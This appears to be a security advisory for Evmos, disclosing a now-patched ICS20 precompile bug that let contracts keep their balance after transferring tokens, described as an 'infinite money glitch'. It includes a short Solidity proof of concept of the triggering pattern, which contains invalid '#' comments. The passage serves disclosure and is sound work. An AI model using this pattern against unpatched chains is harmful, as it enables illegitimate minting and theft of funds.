summary: "Contract balance not updating correctly after interchain transaction\n### Summary\n\
  _Short summary of the problem. Make the impact and severity as clear as possible. For example:\
  \ An unsafe deserialization vulnerability allows any unauthenticated user to execute arbitrary\
  \ code on the server._\n\n### Details\nWe discovered a bug walking through how to liquid stake\
  \ using Safe which itself is a contract. The bug only appears when there is a local state\
  \ change together with an ICS20 transfer in the same function and uses the contract's balance,\
  \ that is using the contract address as the `sender` parameter in an ICS20 transfer using\
  \ the ICS20 precompile\n\n### Proof of Concept\n```solidity\n// This function does not reduce\
  \ the contract balance correctly but liquid stakes correctly \nfunction transfer(\n      \
  \  string memory sourcePort,\n        string memory sourceChannel,\n        string memory\
  \ denom,\n        uint256 amount,\n        string memory receiver,\n        string memory\
  \ evmosReceiver\n    ) external returns (uint64 nextSequence) {\n        counter += 1; # Only\
  \ happens when there is a local state update together with an ICS20 Transfer\n        Height\
  \ memory timeoutHeight =  Height(100, 100);\n        string memory memo = buildLiquidStakeMemo(receiver,\
  \ evmosReceiver);\n        return ICS20_CONTRACT.transfer(\n            sourcePort, \n   \
  \         sourceChannel,\n            denom,\n            amount,\n            address(this),\
  \ # this is the sender address which is the contract\n            receiver,\n            timeoutHeight,\n\
  \            0,\n            memo\n        );\n    }\n```\n\n### Impact\nThis is in essence\
  \ the \"infinite money glitch\" allowing contracts to double the supply of Evmos after each\
  \ transaction.\n\n### Severity\n\nBased on [ImmuneFi Severity Classification System](https://immunefisupport.zendesk.com/hc/en-us/articles/13332717597585-Severity-Classification-System)\
  \ the severity was evaluated to `Critical` since the attack could have lead to create new\
  \ supply of EVMOS and therefore lead to Direct loss of funds's value.\n\n### Patches\n\nThe\
  \ issue has been patched in versions >=V18.1.0. \n\n## For more information\nIf you have any\
